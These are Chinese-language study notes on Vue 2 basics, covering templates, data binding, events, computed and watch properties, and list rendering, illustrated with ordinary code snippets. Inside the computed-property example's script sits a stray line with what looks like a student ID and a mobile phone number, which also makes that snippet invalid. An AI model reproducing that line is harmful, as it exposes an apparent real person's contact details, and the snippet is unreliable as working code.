# 第一章 Vue核心

## 一、Vue简介

### 1. Vue是什么

> 一套用于`构建用户界面`的`渐进式`JavaScript框架。
>
> 1. 拿到的数据通过某种办法变成用户看到的界面
> 2. 渐进式：Vue可以自底向上逐层的应用
>    - 简单应用：只需一个轻量小巧的核心库
>    - 复杂应用：可以引入各式各样的Vue插件

> 前端工程师：在合适的时候发出合适的请求最后把数据展示到合适的位置

### 2. 谁开发的

![image-20230208211121665](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748312.png)

### 3. Vue的特点

> 1. 采用`组件化`模式，提高代码复用率、且让代码更好维护

![image-20230208224242894](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748313.png)

> 2. `声明式`编码，让编码人员无需直接操作DOM（文档对象模型），提高开发效率

![image-20230208224251366](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748314.png)

> 3. 使用`虚拟DOM`+优秀的`Diff算法`，尽量复用DOM节点

![image-20230208224327045](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748315.png)

![image-20230208224314968](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748316.png)

### 4. 前置知识

![image-20230208224345940](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748317.png)

## 二、初识Vue

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../../js/vue.js"></script>
</head>
<body>
     <!-- 准备好一个容器 -->
    <div id="root">
        <h1 v-for="brand in brands">{{brand.brandName}}</h1>
    </div>
    <script type="text/javascript">
         //  开启/关闭生产提示
        Vue.config.productionTip = false
        
        // 创建Vue实例 const x 可以去掉
        const x = new Vue({
            el: "#root", // el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串
            data: { // data中用于存储数据，数据供el所指定的容器去使用，暂时写成一个对象
                name:'unfamous',
                address: 'chzu',
                brands:[{"brandName":"华为"},{"brandName":"小米"}]
            }
        })
        console.log(x);
    </script>
</body>
</html>
```

### 1. 初识Vue

> 初识Vue：
>
> 1. 想让Vue工作，必须创建一个Vue实例，且要传入一个配置对象` Vue({配置对象})`；
>
> 2. root容器里的代码仍然符合html规范，只不过混入了一些特殊的Vue语法；
>
> 3. root容器里的代码被称为`【Vue模板】` 
>
> 4. Vue实例和容器是一一对应的
>
> 5. 真实开发只有一个Vue实例，会配合组件一起使用；
>
> 6. {{xxx}}中的xxx要写成js表达式的形式，xxx会自动读取到data中的所有属性；
>
>    - js表达式：一个表达式会产生一个值
>
>      ```javascript
>      // a
>      // a + b
>      // fun(1)
>      // x === y ? 'a' : 'b'
>      ```
>
>    - js代码（语句）
>
>      ```javascript
>      // if(){}
>      // for(){}
>      ```
>
> 7. 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新
>
> 注意：`live server插件会把当前项目部署到端口5500的内置服务器上`

### 2. Vue模板

> 1. 解析流程
>    - 先有div容器，再有Vue实例。Vue实例发现`el:“#root”`配置好指定的容器时，会把容器里的数据拿过来进行`解析`。去扫描容器里是否有自己设计的`Vue语法`，发现有`{{name}}`，于是就用实例中`data`里对应的name进行替换，把解析完的内容放入对应位置，更新div容器。
>    - `注意：data里的数据一旦有变化，Vue就会把模板重新解析一遍。模板里插值语法是值，则更新所插的值。如果是函数，则重新回调一遍函数`
> 2. 容器的作用
>    - 为Vue提供模板
>    - 为Vue提供解析后数据存放的位置

## 三、模板语法

#### 1.1 插值语法

> 1. 功能：用于解析标签体内容
>
> 2. 写法：{{xxx}}，xxx是js表达式，可以直接读取到data里对应的数据

```html
<div id='root'>
    <div>
        {{name}} // 插值
    </div>
</div>
```

#### 1.2 指令语法

> 1. Vue指令：`v-bind:href`
>    - 绑定之后属性href引号里的值就能被当做js表达式被Vue实例解析
>    - 简写`:href`
> 2. 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件...）
> 3. 举例：v-bind:href="xxx" 或简写为 :href="xxx" xxx为js表达式
> 4. 备注：Vue中有很多指令，形式为v-??? ，v-bind只是其中之一

```Vue
<div id='root'>
    <a v-bind:href="url"></a> 
</div>
<script type="text/javascript">
         //  开启/关闭生产提示
        Vue.config.productionTip = false
        const x = new Vue({
            el: "#root",
            data: { 
                url:'www.baidu.com',
                school: {
                    name: 'school.name' // data里的多级结构
                }
            }
        })
</script>
```

## 四、数据绑定

### 1. 单向数据绑定

> 1. `v-bind:`
>    - 数据只能从data流向页面

```Vue
<div id='root'>
    <a v-bind:href="name"></a> 
</div>
<script type="text/javascript">
        const x = new Vue({
            el: "#root",
            data: { 
				name:'cjj'
            }
        })
</script>
```

### 2. 双向数据绑定

> 1. `v-model:value=""`
>    - data - > 页面， 页面- > data
> 2. 使用场景
>    - 表单类元素：input、select
> 3. 简写：`v-model=""`

## 五、el与data的两种写法

> Vue实例对象`v`：`const v = new Vue({})`
>
> v自身没有的属性可以去v实例缔造者的`原型对象__proto__`上找
>
> ![image-20230227161717176](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748318.png)

![image-20230227161303361](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748319.png)

### 1. el的两种写法

> `$mount方法`：挂载、放
>
> - el有2种写法
>   - new Vue时配置el属性
>   -  先创建Vue实例，再通过vm.$mount('#root')指定el的值

```Vue
<script type="text/javascript">
        const x = new Vue({
            el: "#root", // 第一种写法
            data: { 
				name:'cjj'
            }
        })
</script>
```

```Vue
<script type="text/javascript">
        const x = new Vue({
        })
        x.$mount('#root') // 第二种写法
</script>
```

### 2. data的两种写法

> - data有2种写法
>   - 对象式
>   - 函数式
>   - 如何选择：目前都可以，学到组件则必须使用函数式，否则会报错

```vue
<script type="text/javascript">
        const x = new Vue({
            el: "#root",
            data: {  // 第一种写法
				name:'cjj'
            }
        })
</script>
```

```vue
<script type="text/javascript">
        const x = new Vue({
            el: "#root",
            data:function() {  // 第二种写法
				return{
                    name:'cjj'
                }
            }
        })
</script>
<script type="text/javascript">
        const x = new Vue({
            el: "#root",
            data(){  // 第二种写法简写
				return{
                    name:'cjj'
                }
            }
        })
</script>
```

## 六、MVVM模型

> - MVVM模型
>
>   1. M：模型（Model）：对应data中的数据
>      - Plain JavaScript Objects （一般JS对象），数据得写成一般对象
>   2. V：视图（View）：模板
>      - DOM文档对象模型，Vue的模板经过解析之后生成新的页面，从而生成DOM结构
>   3. VM：视图模型（ViewModel）：Vue实例对象
>      - Data Bindings（数据绑定）：将data里的数据经过Vue实例进行数据绑定，最后放在页面指定位置
>      - DOM Listenners（DOM监听器）：比如监听输入框中内容的变化，然后实时改变data里的数据
>
> - 注意
>
>   - data中的所有属性经过某种操作最后都会作为属性加入到vm实例对象中去
>
>   - vm身上所有的属性以及Vue原型上所有属性，在Vue模板中都可以直接使用
>
>     ```vue
>         <div id="root">
>             <h1>学校名称：{{name}}</h1>	// data里的属性
>             <h1>学校地址：{{address}}</h1> 
>             <h1>测试1：{{1+1}}</h1> 
>             <h1>测试2：{{$children}}</h1> // vm里的属性
>             <h1>测试3：{{$delete}}</h1>
>         </div>
>     ```
>
>     

![image-20230227163217203](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748320.png)

![image-20230227164203024](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748321.png)

## 七、数据代理

### 1. Object.defineProperty方法

> - Object.defineProperty方法
>   - 给一个对象添加/定义属性
>   - 参数
>     - Object.defineProperty(要添加属性的对象，'属性名'，配置对象`{}`)
>     - 配置对象的属性
>       - `value`：属性值
>       - `enumerable`
>         - true：控制属性是否可以枚举，默认false
>       - `writable`
>         - true：控制属性是否可以被修改，默认为false
>       - `configurable`
>         - true：控制属性是否可以被删除，默认为false
>       - `get(){return 返回值}`：当有人读取age属性时，get函数（getter）会被调用，返回值就是age的值
>       - `set(value){}`：当有人修改age属性时，set函数（setter）就会被调用，且会收到具体修改的值传到value参数中

### 2. 何为数据代理

>- 数据代理：通过`一个对象`代理对 `另一个对象`中`属性`的操作
>  - 操作：读/写

![image-20230228105920476](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748322.png)

```vue
<script type="text/javascript">
	let obj1 = {x:100}
    let obj2 = {y:200}
    // 通过obj2对obj1进行数据代理
    Object.defineProperty(obj2, 'x', {
        get(){
            return obj1.x	// obj2对象访问属性x时，会返回obj1.x的值
        },
        set(value){
            obj1.x = value	// obj2对象修改属性x时，会修改obj1.x的值
        }
    })
</script>
```

### 3. Vue中的数据代理

> - Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）
> - Vue中数据代理的好处：更加方便的操作data中的数据
> - 基本原理
>   - 通过Object.defineProperty()把data对象中所有属性添加到vm中
>   - 为每一个添加到vm上的属性，在其配置对象中都指定一个getter/setter
>   - 在getter和setter内部去操作（读/写）data中对应的属性
> - 注意
>   - new Vue({})中的`配置对象{}`里的`data对象`，在实例化vm之前会把`vm._data = options.data`。
>   - options就是配置对象

```vue
<div id="root">
    <h2>学校名称：{{name}}</h2>
    <h2>学校地址：{{address}}</h2>
</div>
<script>
    Vue.config.productionTip = false
    
    const vm = new Vue({
        el: '#root',
        data: {
            name: '尚硅谷',
            address: '科技园'
        }
    })
</script>
```

## 八、事件处理

### 1. 基本使用

>- 事件的基本使用：
>  - 使用v-on:xxx 或 @xxx 绑定事件，xxx是事件名
>  - 事件的回调函数需要配置在methods对象中，最终会添加到vm上
>  - methods中配置的函数，不要用箭头函数！否则this指向的是window而不是vue了
>  - methods中配置的函数，都是被Vue所管理的函数，this指向的是vm 或者组件实例对象
>  - @click="demo" 和 @click="demo($event)" 效果一样，后者可以传参
>- event事件对象
>  - 当回调函数没有指定参数时，会自动传入一个当前事件的对象。
>  - 可以通过`event.target`获取当前事件DOM对象
>  - 可以通过`event.target.innerText`获取当前事件DOM对

```vue
<div id="root">
	<button v-on:click="showInfo1">点我提示信息1，不传参</button>
    <button v-on:click="showInfo2($event,66)"></button>
</div>
<script>
    const vm = new Vue({
        el: '#root',
        data: {
        },
        methods:{
            showInfo1(event){
                
            },
        	showInfo2(event,number){
                
            }
        }
    })
</script>
```

### 2. 事件修饰符

> - Vue中的事件修饰符 
>   - prevent：阻止默认事件（常用）
>   - stop：阻止事件冒泡（常用）
>     - 事件冒泡：即多个组件嵌套，触发内层组件时，会一一触发外层事件
>     - 修饰符可以链式编程，连续写：`@click.stop.prevent="showInfo"`
>   - once：事件只触发一次（常用）
>   - capture：使用事件的捕获模式
>     - 从外往内
>   - self：只有event.target是当前操作的元素时才触发事件
>   - passive：事件的默认行为为立即执行，无需等待事件回调执行完毕
>     - 比如@wheel滚轮滚动事件，无需等待毁掉函数内代码执行，先执行滚动条的默认行为——滚动。
>     - 用的比较少，一般应用于平板和PE端
> - `@Scroll=""`：滚动条滚动事件
> - `@wheel=""`：鼠标滚轮滚动事件

```vue
<div id="root">
    <h2>Myname is {{name}}</h2>
    <!-- 阻止默认事件（常用） -->
    <a href="https://www.bilibili.com" @click.prevent="showInfo">点击提示信息</a>
    <!-- 阻止事件冒泡（常用） -->
    <div class="demo1" @click="showInfo1">
        <button @click.stop="showInfo2">点击提示信息</button>
    </div>
    <!-- 事件只触发一次（常用） -->
    <button @click.once="showInfo">点我触发一次</button>
    <!-- 使用事件的捕获模式 -->
    <div class="box1" @click.capture="showMsg(1)">
        div1
        <div class="box2" @click="showMsg(2)">
            div2
        </div>
    </div>
    <!-- 只有event.target是当前操作的元素时才触发事件 -->
    <div class="demo1" @click.self="showInfo1">
        <button @click="showInfo2">点击提示信息</button>
    </div>
    <!-- 事件的默认行为为立即执行，无需等待事件回调执行完毕 -->
    <!-- @scroll滚动条滚动事件 -->
    <!-- @wheel鼠标滚轮滚动事件 -->
    <ul class="list" @wheel.passive="demo">
        <li>1</li>
        <li>2</li>
        <li>3</li>
        <li>4</li>
    </ul>
</div>

<script>
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            name: 'unfamous'
        },
        methods: {
            showInfo(event) {
                console.log(event.target);
            },
            showInfo1(event) {
                console.log("我是demo1");
            },
            showInfo2(event) {
                console.log("我是button");
            },
            showMsg(msg) {
                console.log(msg);
            },
            demo() {
                for (let i = 0; i < 10000; i++) {
                    console.log(i);
                }
                console.log("滚动了");
            }
        }
    })
</script>
```

### 3. 键盘事件

> - @keydown
>   - 作用：按下按键即可触发事件
>   - 修饰符
> - @keyup
>   - 作用：按下并抬起键盘才可触发事件
> - 常见的按键别名
>   - 每个别名
>   - enter：回车
>   - delete：删除，捕获（“删除”，和“退格”键）
>   - esc：退出
>   - space：空格
>   - tab：换行
>     - 必须配合keydown使用
>   - up：上
>   - down：下
>   - left：左
>   - right：右
> - Vue未提供的别名的按键，可以使用按键原始key值去绑定，但要注意转为kebab-case（短横线命名）
> - 系统修饰键（用法特殊）：ctrl、alt、shift、meta
>   - 配合keyup键使用：按下修饰键的同时，再按下其它键，随后释放其它键，事件才被触发。
>     - `小技巧：@keyup.ctrl.y`可以使用指定快捷键触发事件
>   - 配合keydown使用：正常触发事件
> - 也可以使用keyCode去指定具体的按键（不推荐）
> - Vue.config.keyCodes.自定义键名 = 键码，可以自定义按键别名

## 九、计算属性

### 1. 姓名案例_插值语法实现

```vue
<div id="root">
    姓：<input type="text" v-model="firstName"><br>
    名：<input type="text" v-model="lastName"><br>
    全名：<span>{{firstName}}-{{lastName}}</span>
</div>
<script>
    Vue.config.productionTip = false
    
    new Vue({
        el: '#root',
        data: {
            firstName:'张',
            lastName:'三'
        }
    })
</script>
```

### 2. 姓名案例_methods实现

```vue
<div id="root">
    姓：<input type="text" v-model="firstName"><br>
    名：<input type="text" v-model="lastName"><br>
    全名：<span>{{fullName()}}</span><br>
</div>
<script>
    Vue.config.productionTip = false
    
    new Vue({
        el: '#root',
        data: {
            firstName:'张',
            lastName:'三'
        },
        methods:{
            fullName(){
                return this.firstName + '-' + this.lastName
            }
        }
    })
</script>
```

### 3. 姓名案例_计算属性实现

> - 属性：`data对象`里的键值对我们都可以叫做属性，包括函数。
>   - 键：属性名
>   - 值：属性值
> - 计算属性
>   - 定义：通过已知属性之间计算得出来的新属性
>   - 原理：底层借助了Object.defineProperty()提供的getter和setter。
>   - 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便
>   - 备注
>     - 计算的属性最后会出现在vm上，直接读取使用即可。
>     - 如果计算的属性要被修改，那必须写set函数去响应修改，且set中药引起计算时依赖的数据发生改变
> - 注意
>   - `computed对象`里计算属性的函数中的get()方法由`Vue`来调用，并将其this指向`Vue`，也就是vm。
>   - 当由多个模板里的插值语法为同一个`计算属性的方法`时，get()方法只调用一次，并把返回值存到`缓存`中去，其它原本需要调用get()的地方，只需从缓存里直接拿值即可。
>   - vm里的fullName不是对象，而是计算后的新属性，同样需要get()调用时赋值

```vue
<div id="root">
    姓：<input type="text" v-model="firstName"><br>
    名：<input type="text" v-model="lastName"><br>
    全名：<span>{{fullName}}</span><br>
</div>
<script>
    Vue.config.productionTip = false
    信院 软工退伍 2016211
    19856919192
    const vm = new Vue({
        el: '#root',
        data: {
            firstName:'张',
            lastName:'三'
        },
        computed:{
            fullName:{
                // 当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
                // get什么时候被调用：1.初次读取fullName时 2.所依赖的数据发生变化时
                get(){
                    console.log("get()")
                    return this.firstName + '-' + this.lastName
                },
                set(value){
                    console.log("set()");
                    var arr = value.split('-')
                    this.firstName = arr[0]
                    this.lastName = arr[1]
                }
            }
        }
    })
</script>
```

### 4. 计算属性简写

> - 简写：当计算属性只需要getter时，可以简写而省略get()

```vue
<script>
    Vue.config.productionTip = false
    
    const vm = new Vue({
        el: '#root',
        data: {
            firstName:'张',
            lastName:'三'
        },
        computed:{
            fullName(){ // 简写
                return
            }
        }
    })
</script>
```

## 十、监视属性

### 1. 天气案例

> - 注意
>
>   - ```Vue
>     <button @click="isHot = !isHot">切换天气</button>
>     ```
>
>   - 绑定事件的时候，模板里可以写一些能被Vue实例解析的表达式，即可以从data里找到。

![image-20230228211924746](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748323.png)

### 2. 监视属性

> - `watch`：Vue配置对象里的一个属性
>   - 用法：watch的值是各种所监视值的同名对象
>   - watch所监视对象拥有的方法/属性
>     - `handler(newValue,oldValue)`：监测器，能监测被监测属性值是否发生变化，并用参数存储变化前后的值
>       - 参数
>         - newValue：改变后的属性值
>         - oldValue：改变前的属性值
>     - `immediate`：初始化是否让handler调用一下
>       - 属性值
>         - 默认值false
>         - true
> - 注意
>   - 当被监视的属性变化时，回调函数（`handler()`）自动调用，进行相关操作
>   - 监视的属性必须存在，才能进行监视
>   - 监视的两种写法
>     - `new Vue({})`时传入watch配置
>     - 通过`vm.$watch`监视

```vue
<div id="root">
    <h2>今天天气很{{info}}</h2>
    <button @click="changeWeather">切换天气</button>
</div>
<script>
    Vue.config.productionTip = false
    
    new Vue({
        el: '#root',
        data: {
            isHot:true
        },
        methods: {
            changeWeather(){
                this.isHot = !this.isHot
            }
        },
        computed:{
            info(){
                return this.isHot ? '炎热' : '凉爽'
            }
        },
        watch:{	// 方法一
            isHot:{
                handler(newValue,oldValue){
                    console.log(newValue,oldValue)
                },
                immediate:true
            }
        }
    })
</script>
```

```Vue
<div id="root">
    <h2>今天天气很{{info}}</h2>
    <button @click="changeWeather">切换天气</button>
</div>
<script>
    Vue.config.productionTip = false
    
    const vm = new Vue({
        el: '#root',
        data: {
            isHot:true
        },
        methods: {
            changeWeather(){
                this.isHot = !this.isHot
            }
        },
        computed:{
            info(){
                return this.isHot ? '炎热' : '凉爽'
            }
        }
    })
    vm.$watch('isHot',{ // 方法二
                handler(newValue,oldValue){
                    console.log(newValue,oldValue)
                },
                immediate:true        
    })
</script>
```

### 3. 深度监视

> - 深度监视
>   - Vue中的watch默认不监测对象内部值的改变（一层）
>   - 配置`deep:true`可以监测对象内部值改变（多层）
> - 注意
>   - Vue自身可以监测对象内部值的改变（可以直接修改data的值，并更新页面），但Vue提供的watch默认不可以。
>   - 使用watch时根据数据的具体结构，决定是否采用深度监视

```vue
<div id="root">
    <span>a的值为{{numbers.a}}</span><br><br>
    <button @click="numbers.a++">点我让a++</button><br><br>
    <span>b的值为{{numbers.b}}</span><br><br>
    <button @click="numbers.b++">点我让b++</button><br><br>
</div>
<script>
    Vue.config.productionTip = false
    
    const vm = new Vue({
        el: '#root',
        data: {
            numbers:{
                a:10,
                b:20
            }
        },
        watch:{
            numbers:{
                deep:true,
                handler(){
                    console.log("numbers里的值改变了");
                }
            }
        }
    })
</script>
```

### 4. 监视的简写形式

> - 简写：当配置项里只需要`handler()`时才可以简写

```vue
<script>
    Vue.config.productionTip = false
    
    const vm = new Vue({
        el: '#root',
        data: {
            isHot:true
        },
        watch:{
            isHot(newValue, oldValue){
                console.log('isHot被修改了')
            }
        }
    })
</script>
```

### 5. 监视属性和计算属性对比

> - computed和watch之间的区别：
>   - computed能完成的功能，watch都可以完成
>   - watch能完成的功能，computed不一定能完成。例如：watch可以进行异步操作。
> - 注意：
>   - 所被Vue管理的函数最好写成普通函数，这样`this`的指向才是`vm`或`组件实例对象`
>   - 所有不被Vue管理的函数（`定时器的回调函数、ajax的回调函数、Promiss的回调函数等`），最好写成箭头函数
>   - `setTimeout(function(){})`：定时器是由JS引擎帮忙调用的，this指向的是window
>   - `setTimeout(()=>{})`：箭头函数没有自己的this，于是只能往外找，firstName是普通函数，而且是Vue所管理的函数，所以this应当指向vm

```vue
<script>
    Vue.config.productionTip = false
    
    const vm = new Vue({
        el: '#root',
        data: {
            firstName:'张',
            lastName:'三',
            fullName:'张-三'
        },
        watch:{
            firstName(val){
                // 等1s中钟改姓
                setTimeout(()=>{
                    this.fullName = val + '-' + this.lastName
                },1000)
            },
            lastName(val){
                this.fullName = this.firstName + '-' + val
            }
        }
    })
</script>
```

## 十一、绑定样式

### 1. class绑定样式

```vue
<div id="root">
    <!-- 绑定class样式———字符串写法。适用于：样式的class名称不确定，需要动态指定 -->
    <div @click="changeMood" class="basic" :class="mood">{{name}}</div>
    <!-- 绑定class样式———数组写法。适用于：要绑定的样式个数不确定，名字也不确定 -->
    <div @click="changeMood" class="basic" :class="classArr">{{name}}</div>   
    <!-- 绑定class样式———对象写法。适用于：要绑定的样式个数确定、名字也确定、但要动态决定用不用 -->
    <div @click="changeMood" class="basic" :class="classObj">{{name}}</div>  
</div>
<script>
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            name:'cjj',
            mood:'normal', // 默认值
            classArr:['atguigu1','atguigu2','atguigu3'], // 动态修改数组里的值
            classObj:{
                atguigu1:false,
                atguigu2:false
            }
        },
        methods: {
            changeMood(){
                const arr = ['happy', 'sad', 'normal']
                const index = Math.floor(Math.random()*3)
                this.mood = arr[index]
            }
        },
    })
</script>
```

### 2. style绑定样式

```vue
<div id="root">
    <!-- 绑定style样式———对象写法 -->
    <div class="basic" :style="styleObj">{{name}}</div>
    <div class="basic" :style="{fontSize: fsize + 'px'}">{{name}}</div>
    <!-- 绑定style样式———数组写法 -->
    <div class="basic" :style="styleArr">{{name}}</div>
    <div class="basic" :style="[styleObj1,styleObj2]">{{name}}</div>
</div>
<script>
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            name: 'cjj',
            styleObj: {	// 样式对象
                fontSize: '40px',
                color: 'red'
            },
            styleArr: [	// 数组里存放一个个样式对象
                {
                    fontSize: '40px',
                    color: 'red'
                },
                {
                    backgroundColor:'orange'
                }
            ]
        },
        methods: {},
    })
</script>
```

## 十二、条件渲染

> - 条件渲染指令
>   - `v-if`
>     - 写法：
>       - `v-if="表达式"`
>       - `v-else-if="表达式"`
>       - `v-else="表达式"`
>     - 适用于：切换频率较低的场景
>     - 特点：不展示的DOM元素直接被`移除`
>     - 注意：`v-if`可以和`v-else-if、v-else`一起使用，但要求结构不能被`打断`
>   - `v-show`
>     - 写法：
>       - `v-show="表达式"`
>     - 适用于：切换频率较高的场景
>     - 特点：不展示的DOM元素未被移除，仅仅使用`display: none`隐藏掉
> - `<template></template>`标签：
>   - 可以再其标签上写一些vue指令语法，被其包裹的DOM结点在渲染时，会去掉`template`标签从而不影响结构
>   - 例如：`v-if`与`template`的配合使用

```vue
<div id="root">
    <!-- v-show -->
    <h2 v-show="true">v-show="true"</h2>
    <h2 v-show="false">v-show="false"</h2>
    <!-- v-if -->
    <h2 v-if="true">v-if="true"</h2>
    <h2 v-if="true">v-if="true"</h2>
    <template v-if="condition">
        <div>
            <h2>1</h2>
            <h2>2</h2>
        </div>
    </template>
    <button @click="condition = !condition">点击切换状态</button>
</div>
<script>
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            condition:true
        }
    })
</script>
```

## 十三、列表渲染

### 1. 基本列表

> - `v-for`指令
>   - 用于展示列表数据
>   - 语法：`v-for="(item,index)" in xxx :key="yyy"`
>   - 可遍历：数组、对象、字符串、指定次数。

```vue
<div id="root">
    <h2>人员列表（遍历数组）</h2>
    <ul>
        <li v-for="(p,index) in persons" :key="index">
            {{p.name}}---{{p.age}}
        </li>
    </ul>
    <h2>汽车信息（遍历对象）</h2>
    <ul>
        <li v-for="(value,k) in car" :key="k">
            {{k}}---{{value}}
        </li>
    </ul>
    <h2>测试遍历字符串（用的少）</h2>
    <ul>
        <li v-for="(char,index) in str" :key="index">
            {{char}}---{{index}}
        </li>
    </ul>
    <h2>遍历指定次数（用的少）</h2>
    <ul>
        <li v-for="(a,b) in 5">
            {{a}}---{{b}}
        </li>
    </ul>
</div>
<script>
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            persons:[
                {id:'001',name:'张三',age:18},
                {id:'002',name:'李四',age:18},
                {id:'003',name:'王五',age:18}
            ],
            car:{
                name:'奥迪A6',
                price:'70万',
                color:'黑色'
            },
            str:'hello'
        }
    })
</script>
```

### 2. key作用与原理

> 面试题：vue中的key有什么作用?（key内部原理）——`虚拟DOM对比算法`
>
> 1. 虚拟DOM中key的作用
>    - key是虚拟DOM对象的标识，当状态中的数据发生变化时（添加/删除等），Vue会根据`【新数据】`生成`【新的虚拟DOM】`，随后Vue进行`【新虚拟DOM】`与`【旧虚拟DOM】`的差异比较，规则如下。
> 2. 对比规则
>    - 旧虚拟DOM中找到了与新虚拟DOM相同的key：
>      - 若虚拟DOM中内容没变，直接使用之前的真实DOM（`复用`）
>      - 若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM
>    - 旧虚拟DOM中未找到与新虚拟DOM相同的key
>      - 创建新的真实DOM，随后渲染到页面
> 3. 用index作为key可能会引发的问题
>    - 若对数据进行`逆序添加、逆序删除`等破坏性操作
>      - 会产生没有必要的真实DOM更新 ——> 界面效果没问题，但效率低
>    - 如果结构中还包含输入类的DOM
>      - 会产生错误DOM更新 ——> 界面会出现错位相关问题
> 4. 开发中如何选择key
>    - 最好使用每条数据的`唯一标识`作为key，比如id、手机号、身份证号、学号等唯一值
>    - 如果不存在对数据的逆序添加、逆序删除等破坏顺序的手段、仅用于展示，使用index作为key是没有问题的

![image-20230301192438996](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748324.png)

![image-20230301192447165](https://gitee.com/chen-jiujia/typora-picgo/raw/master/img/202309251748325.png)

### 3. 列表过滤

#### 3.1 watch过滤

```vue
<div id="root">
    <input type="text" placeholder="请输入名字" v-model="keyWord">
    <h2>人员列表</h2>
    <ul>
        <li v-for="(p,index) in filPersons" :key="index">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul>
</div>
<script>
    new Vue({
        el: '#root',
        data: {
            keyWord:'',
            persons:[
                {id:'001',name:'马冬梅',age:18,sex:'女'},
                {id:'002',name:'周冬雨',age:18,sex:'女'},
                {id:'003',name:'周杰伦',age:18,sex:'男'},
                {id:'004',name:'温兆伦',age:18,sex:'男'}
            ],
            filPersons:[]
        },
        watch:{
            keyWord:{
                immediate:true,
                handler(val){
                    // p 为形参
                    this.filPersons = this.persons.filter((p)=>{
                        // return:过滤条件 把包含的元素放入到一个新的数组里
                        return p.name.indexOf(val) != -1 
                    })
                }
            }
        }
    })
</script>
```

#### 3.2 computed过滤

```vue
<script>
    new Vue({
        el: '#root',
        data: {
            keyWord:'',
            persons:[
                {id:'001',name:'马冬梅',age:18,sex:'女'},
                {id:'002',name:'周冬雨',age:18,sex:'女'},
                {id:'003',name:'周杰伦',age:18,sex:'男'},
                {id:'004',name:'温兆伦',age:18,sex:'男'}
            ],
            filPersons:[]
        },
        computed:{
            filPersons(){
                // 返回过滤后的数组
                return this.persons.filter((p)=>{
                    // 过滤条件
                    return p.name.indexOf(this.keyWord) != -1
                })
            }
        }
    })
</script>
```

### 4. 列表排序

```vue
<div id="root">
    <h2>人员列表</h2>
    <input type="text" placeholder="请输入名字" v-model="keyWord">
    <button @click="sortType = 2">年龄升序</button>
    <button @click="sortType = 1">年龄降序</button>
    <button @click="sortType = 0">原顺序</button>
    <ul>
        <li v-for="(p,index) in filPersons" :key="p.id">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul>
</div>
<script>
    new Vue({
        el: '#root',
        data: {
            keyWord:'',
            sortType: 0, // 0原顺序 1降序 2升序
            persons:[
                {id:'001',name:'马冬梅',age:18,sex:'女'},
                {id:'002',name:'周冬雨',age:20,sex:'女'},
                {id:'003',name:'周杰伦',age:35,sex:'男'},
                {id:'004',name:'温兆伦',age:11,sex:'男'}
            ]
        },
        computed:{
            filPersons(){
                const arr = this.persons.filter((p)=>{
                    return p.name.indexOf(this.keyWord) != -1
                })
                // 判断是否需要排序
                if(this.sortType)
                arr.sort((p1,p2)=>{
                    return this.sortType === 1 ? p2.age - p1.age : 													p1.age - p2.age
                })
                return arr
            }
        }
    })
</script>
```

### 5. Vue监测数据的原理`☆` 

#### 5.1 模拟监测对象

```vue
<script>
    // data
    let data = {
        name: '尚硅谷',
        address: '北京'
    }
    // 创建一个监视器实例对象，用于监测data中属性的变化
    const obs = new Observer(data)
    
    // 准备一个vm实例对象
    let vm = {}
    vm._data = obs
    // 监视器构造函数
    function Observer(obj){
        // 汇总data里所有的属性名，返回一个数组。
        const keys = Object.keys(obj)
        // 遍历
        keys.forEach((k)=>{
            // this是obs
            Object.defineProperty(this,k,{
                get(){
                    return obj[k] 
                },
                set(val){
                    console.log("_data中的："+k +"，被修改了",val);
                    obj[k] = val
                }
            })
        })
    }
</script>
```

#### 5.2 模拟监测数组

#### 5.3 Vue.set的使用

```vue
<div id="root">
        <h1>学校信息</h1>
        <h2>学校名称：{{school.name}}</h2>
        <h2>学校地址：{{school.address}}</h2>
        <h2>校长是：{{school.leader}}</h2>
        <hr>
        <h1>学生信息</h1>
        <button @click="addSex">添加一个性别属性，默认值为男</button>
        <h2 v-if="student.sex">性别：{{student.sex}}</h2>
        <h2>真实年龄：{{student.age.rAge}},
            对外年龄：{{student.age.sAge}}</h2>
        <ul>
            <li v-for="(friend, index) in student.friends" 																	:key="index">
                {{friend.name}}-{{friend.age}}
            </li>
        </ul>
    </div>
    <script>
        const vm =new Vue({
            el: '#root',
            data: {
                school: {
                    name: '尚硅谷',
                    address: '北京',
                    leader: ''
                },
                student: {
                    age: {
                        rAge: 20,
                        sAge: 30
                    },
                    friends: [{
                            name: 'jerry',
                            age: 35
                        },
                        {
                            name: 'tony',
                            age: 36
                        }
                    ]
                }
            },
            methods: {
                addSex(){
                    Vue.set(this.student,'sex','男')
                }
            },
        })
    </script>
```

#### 5.4 Vue监测数据总结

> - Vue监测数据原理
>   1. Vue会监视data中所有层次的数据
>   2. 如何监测对象中的数据？
